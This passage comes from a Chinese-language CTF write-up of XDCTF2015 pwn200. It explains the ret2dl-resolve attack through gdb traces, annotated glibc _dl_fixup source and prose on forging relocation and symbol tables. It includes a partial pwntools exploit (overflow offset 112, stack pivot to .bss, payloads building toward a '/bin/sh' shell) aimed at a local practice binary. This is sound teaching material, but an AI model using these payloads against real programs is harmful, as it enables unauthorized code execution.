EIP: 0xf7fec37b (: call 0xf7fe608
0 )
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0xf7fec372 : push edx
0xf7fec373 : mov edx,DWORD PTR [es
p+0x10]
0xf7fec377 : mov eax,DWORD PTR [es
p+0xc]
=> 0xf7fec37b : call 0xf7fe6080 
0xf7fec380 : pop edx
0xf7fec381 : mov ecx,DWORD PTR [es
p]
0xf7fec384 : mov DWORD PTR [esp],e
ax
0xf7fec387 : mov eax,DWORD PTR [es
p+0x4]
Guessed arguments:
arg[0]: 0x3
arg[1]: 0x2a8c
arg[2]: 0xffffd5bc ("Welcome to XDCTF2015~!\n")
[------------------------------------stack----------------------
---------------]
0000| 0xffffd588 --> 0x3
0004| 0xffffd58c --> 0x2a8c
0008| 0xffffd590 --> 0xffffd5bc ("Welcome to XDCTF2015~!\n")
0012| 0xffffd594 --> 0xf7ffd900 --> 0x0
0016| 0xffffd598 --> 0x20 (' ')
0020| 0xffffd59c --> 0x804861b (add esp,0x10)
0024| 0xffffd5a0 --> 0x1
920
6.1.3 pwn XDCTF2015 pwn200
0028| 0xffffd5a4 --> 0xffffd5bc ("Welcome to XDCTF2015~!\n")
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
0xf7fec37b in _dl_runtime_resolve () from /lib/ld-linux.so.2
gdb-peda$ s
[----------------------------------registers--------------------
---------------]
EAX: 0xffffd5bc ("Welcome to XDCTF2015~!\n")
EBX: 0x804a000 --> 0x8049f04 --> 0x1
ECX: 0x2a8c
EDX: 0x3
ESI: 0xf7f8ee28 --> 0x1d1d30
EDI: 0xffffd620 --> 0x1
EBP: 0xffffd638 --> 0x0
ESP: 0xffffd59c --> 0x804861b (add esp,0x10)
EIP: 0xf7ea3100 (: push esi)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0xf7ea30fb: xchg ax,ax
0xf7ea30fd: xchg ax,ax
0xf7ea30ff: nop
=> 0xf7ea3100 : push esi
0xf7ea3101 : push ebx
0xf7ea3102 : sub esp,0x14
0xf7ea3105 : mov ebx,DWORD PTR [esp+0x20]
0xf7ea3109 : mov ecx,DWORD PTR [esp+0x24]
[------------------------------------stack----------------------
---------------]
0000| 0xffffd59c --> 0x804861b (add esp,0x10)
0004| 0xffffd5a0 --> 0x1
0008| 0xffffd5a4 --> 0xffffd5bc ("Welcome to XDCTF2015~!\n")
0012| 0xffffd5a8 --> 0x17
0016| 0xffffd5ac --> 0x80485a4 (add ebx,0x1a5c)
0020| 0xffffd5b0 --> 0xffffd5ea --> 0x0
0024| 0xffffd5b4 --> 0xf7ffca64 --> 0x6
0028| 0xffffd5b8 --> 0xf7ffca68 --> 0x3c ('r_info，获取函数在
动态链接符号表中对应的条目
922
6.1.3 pwn XDCTF2015 pwn200
const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
const ElfW(Sym) *refsym = sym;
void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
lookup_t result;
DL_FIXUP_VALUE_TYPE value;
/* Sanity check that we're really looking at a PLT relocation.
*/
assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);
/* Look up the target symbol. If the normal lookup rules are
not
used don't look in the global scope. */
if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0)
== 0)
{
const struct r_found_version *version = NULL;
if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
{
const ElfW(Half) *vernum =
(const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7
fff;
version = &l->l_versions[ndx];
if (version->hash == 0)
version = NULL;
}
/* We need to keep the scope around so do some locking. T
his is
not necessary for objects which cannot be unloaded or when
we are not using any threads (yet). */
int flags = DL_LOOKUP_ADD_DEPENDENCY;
if (!RTLD_SINGLE_THREAD_P)
{
THREAD_GSCOPE_SET_FLAG ();
flags |= DL_LOOKUP_GSCOPE_LOCK;
}
923
6.1.3 pwn XDCTF2015 pwn200
#ifdef RTLD_ENABLE_FOREIGN_CALL
RTLD_ENABLE_FOREIGN_CALL;
#endif
// 根据 strtab+sym->st_name 在字符串表中找到函数名，然后进行符号
查找获取 libc 基址 result
result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &s
ym, l->l_scope,
version, ELF_RTYPE_CLASS_PLT, flags, NULL);
/* We are done with the global scope. */
if (!RTLD_SINGLE_THREAD_P)
THREAD_GSCOPE_RESET_FLAG ();
#ifdef RTLD_FINALIZE_FOREIGN_CALL
RTLD_FINALIZE_FOREIGN_CALL;
#endif
/* Currently result contains the base load address (or lin
k map)
of the object that defines sym. Now add in the symbol
offset. */
// 将要解析的函数的偏移地址加上 libc 基址，得到函数的实际地址
value = DL_FIXUP_MAKE_VALUE (result,
sym ? (LOOKUP_VALUE_ADDRESS (result)
+ sym->st_value) : 0);
}
else
{
/* We already found the symbol. The module (and therefore
its load
address) is also known. */
value = DL_FIXUP_MAKE_VALUE (l, l->l_addr + sym->st_value)
;
result = l;
}
/* And now perhaps the relocation addend. */
value = elf_machine_plt_value (l, reloc, value);
924
6.1.3 pwn XDCTF2015 pwn200
// 将已经解析完成的函数地址写入相应的 GOT 表中
if (sym != NULL
&& __builtin_expect (ELFW(ST_TYPE) (sym->st_info) == STT_G
NU_IFUNC, 0))
value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));
/* Finally, fix up the plt itself. */
if (__glibc_unlikely (GLRO(dl_bind_not)))
return value;
return elf_machine_fixup_plt (l, result, refsym, sym, reloc, r
el_addr, value);
}
攻击
关于延迟绑定的攻击，在于强迫动态装载器解析请求的函数。
图a中，因为动态转载器是从 .dynamic 段的 DT_STRTAB 条目中获得
.dynstr 段的地址的，而 DT_STRTAB 条目的位置已知，默认情况下也可
写。所以攻击者能够改写 DT_STRTAB 条目的内容，欺骗动态装载器，让它
以为 .dynstr 段在 .bss 段中，并在那里伪造一个假的字符串表。当它尝
试解析 printf 时会使用不同的基地址来寻找函数名，最终执行的是 execve。这
种方式非常简单，但仅当二进制程序的 .dynamic 段可写时有效。
925
6.1.3 pwn XDCTF2015 pwn200
图b中，我们已经知道 _dl_runtime_resolve 的第二个参数是 Elf_Rel 条目
在 .rel.plt 段中的偏移，动态装载器将这个值加上 .rel.plt 的基址来
得到目标结构体的绝对位置。然后当传递给 _dl_runtime_resolve 的参数
reloc_index 超出了 .rel.plt 段，并最终落在 .bss 段中时，攻击者
可以在该位置伪造了一个 Elf_Rel 结构，并填写 r_offset 的值为一个可
写的内存地址来将解析后的函数地址写在那里，同理 r_info 也会是一个将
动态装载器导向到攻击者控制内存的下标。这个下标就指向一个位于它后面的
Elf_Sym 结构，而 Elf_Sym 结构中的 st_name 同样超出了 .dynsym
段。这样这个符号就会包含一个相对于 .dynstr 地址足够大的偏移使其能够
达到这个符号之后的一段内存，而那段内存里保存着这个将要调用的函数的名
称。
还记得我们前面说过的 GOT[1]，它是一个 link_map 类型的指针，其 l_info 域
中有一个包含 .dynmic 段中所有条目构成的数组。动态链接器就是利用这些指针
来定位符号解析过程中使用的对象的。通过覆盖这个 link_map 的一部分，就能够
将 l_info 域中的 DT_STRTAB 条目指向一个特意制造的动态条目，那里则指向
一个假的动态字符串表。
926
6.1.3 pwn XDCTF2015 pwn200
pwn200
获得了 re2dl-resolve 所需的所有知识，下面我们来分析题目。
首先触发栈溢出漏洞，偏移为 112：
gdb-peda$ pattern_offset 0x41384141
1094205761 found at offset: 112
根据理论知识及对二进制文件的分析，我们需要一个 read 函数用于读入后续的
payload 和伪造的各种表，一个 write 函数用于验证每一步的正确性，最后将 write
换成 system，就能得到 shell 了。
927
6.1.3 pwn XDCTF2015 pwn200
from pwn import *
# context.log_level = 'debug'
elf = ELF('./a.out')
io = remote('127.0.0.1', 10001)
io.recv()
pppr_addr = 0x08048699 # pop esi ; pop edi ; pop ebp ;
ret
pop_ebp_addr = 0x0804869b # pop ebp ; ret
leave_ret_addr = 0x080484b6 # leave ; ret
write_plt = elf.plt['write']
write_got = elf.got['write']
read_plt = elf.plt['read']
plt_0 = elf.get_section_by_name('.plt').header.sh_addr
# 0x80483e0
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
# 0x8048390
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
# 0x80481cc
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
# 0x804828c
bss_addr = elf.get_section_by_name('.bss').header.sh_addr
# 0x804a028
base_addr = bss_addr + 0x600 # 0x804a628
分别获取伪造各种表所需要的段地址，将 bss 段的地址加上 0x600 作为伪造数据的
基地址，这里可能需要根据实际情况稍加修改。gadget pppr 用于平衡栈， pop
ebp 和 leave ret 配合，以达到将 esp 指向 base_addr 的目的（在章节3.3.4中有讲
到）。
第一部分的 payload 如下所示，首先从标准输入读取 100 字节到 base_addr，将
esp 指向它，并跳转过去，执行 base_addr 处的 payload：
928
6.1.3 pwn XDCTF2015 pwn200
payload_1 = "A" * 112
payload_1 += p32(read_plt)
payload_1 += p32(pppr_addr)
payload_1 += p32(0)
payload_1 += p32(base_addr)
payload_1 += p32(100)
payload_1 += p32(pop_ebp_addr)
payload_1 += p32(base_addr)
payload_1 += p32(leave_ret_addr)
io.send(payload_1)
从这里开始，后面的 paylaod 都是通过 read 函数读入的，所以必须为 100 字节
长。首先，调用 write@plt 函数打印出与 base_addr 偏移 80 字节处的字符串
"/bin/sh"，以验证栈转移成功。注意由于 .dynstr 中的字符串都是以 \x00 结
尾的，所以伪造字符串为 bin/sh\x00 。
payload_2 = "AAAA" # new ebp
payload_2 += p32(write_plt)
payload_2 += "AAAA"
payload_2 += p32(1)
payload_2 += p32(base_addr + 80)
payload_2 += p32(len("/bin/sh"))
payload_2 += "A" * (80 - len(payload_2))
payload_2 += "/bin/sh\x00"
payload_2 += "A" * (100 - len(payload_2))
io.sendline(payload_2)
print io.recv()
我们知道第一次调用 write@plt 时其实是先将 reloc_index 压入栈，然后跳转到
PLT[0]：
929